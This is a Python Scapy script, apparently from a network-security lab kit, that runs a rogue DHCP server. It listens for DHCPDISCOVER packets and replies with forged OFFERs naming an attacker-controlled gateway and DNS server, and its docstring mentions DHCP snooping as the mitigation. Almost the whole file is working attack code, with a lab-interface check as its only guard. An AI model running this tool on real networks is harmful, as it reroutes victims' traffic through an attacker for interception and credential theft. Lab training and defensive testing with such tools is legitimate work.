#!/usr/bin/env python3
"""DHCP: rogue server — answers DHCPDISCOVER with a forged OFFER handing out
an attacker-controlled gateway/DNS. Mitigation: DHCP snooping + trust
(see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, iface_mac  # noqa: E402


def ip_to_int(ip):
    parts = [int(x) for x in ip.split(".")]
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]


def int_to_ip(n):
    return "%d.%d.%d.%d" % ((n >> 24) & 255, (n >> 16) & 255, (n >> 8) & 255, n & 255)


def build_offer(scapy_all, xid, chaddr, offer_ip, gateway, dns, lease_time, src):
    Ether, IP, UDP, BOOTP, DHCP = (scapy_all.Ether, scapy_all.IP, scapy_all.UDP,
                                    scapy_all.BOOTP, scapy_all.DHCP)
    # A valid (non-zero) L2 source is required or the PNetLab link bridge drops
    # the forged OFFER before the victim sees it — see common.iface_mac(). This
    # rogue server answers from the attacker's real NIC MAC.
    return (Ether(src=src, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=gateway, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offer_ip, siaddr=gateway, chaddr=chaddr, xid=xid) /
            DHCP(options=[("message-type", "offer"), ("server_id", gateway),
                           ("lease_time", lease_time), ("router", gateway),
                           ("name_server", dns), ("subnet_mask", "255.255.255.0"), "end"]))


def main():
    p = base_parser("Rogue DHCP server — answers DISCOVER with forged OFFERs")
    p.add_argument("--pool_start", default="192.168.1.100")
    p.add_argument("--pool_end", default="192.168.1.150")
    p.add_argument("--gateway", default="192.168.1.66", help="gateway handed out to victims")
    p.add_argument("--dns", default="192.168.1.66", help="DNS server handed out to victims")
    p.add_argument("--lease_time", type=int, default=3600)
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    src = iface_mac(args.iface)
    if args.selftest:
        pkt = build_offer(scapy_all, 1234, b"\x02\x00\x00\xaa\xbb\xcc" + b"\x00" * 10,
                           args.pool_start, args.gateway, args.dns, args.lease_time, src)
        selftest_ok("dhcp_rogue", "DHCPOFFER len=%d" % len(bytes(pkt)))
        return

    lo = ip_to_int(args.pool_start)
    hi = ip_to_int(args.pool_end)
    cursor = [lo]

    def next_ip():
        ip = int_to_ip(cursor[0])
        cursor[0] = lo if cursor[0] >= hi else cursor[0] + 1
        return ip

    def one_round(n):
        status("INFO", "round #%d: listening for DHCPDISCOVER on %s (pool %s-%s)" %
               (n + 1, args.iface, args.pool_start, args.pool_end))
        offered = [0]

        def on_pkt(pkt):
            if not pkt.haslayer(scapy_all.DHCP):
                return
            opts = dict((o[0], o[1]) for o in pkt[scapy_all.DHCP].options if isinstance(o, tuple))
            if opts.get("message-type") != 1:  # only react to DISCOVER
                return
            xid = pkt[scapy_all.BOOTP].xid
            chaddr = pkt[scapy_all.BOOTP].chaddr
            offer_ip = next_ip()
            scapy_all.sendp(build_offer(scapy_all, xid, chaddr, offer_ip, args.gateway, args.dns, args.lease_time, src),
                             iface=args.iface, verbose=0)
            offered[0] += 1
            status("SENT", "OFFER %s -> chaddr=%s (gateway=%s dns=%s)" %
                   (offer_ip, chaddr.hex(), args.gateway, args.dns))

        scapy_all.sniff(iface=args.iface, filter="udp and port 67", timeout=args.interval or 5,
                         prn=on_pkt, store=0)
        status("INFO", "round #%d: %d offer(s) sent" % (n + 1, offered[0]))

    run_loop(args.count, 0.1, one_round)  # sniff() inside already provides the wait


if __name__ == "__main__":
    main()

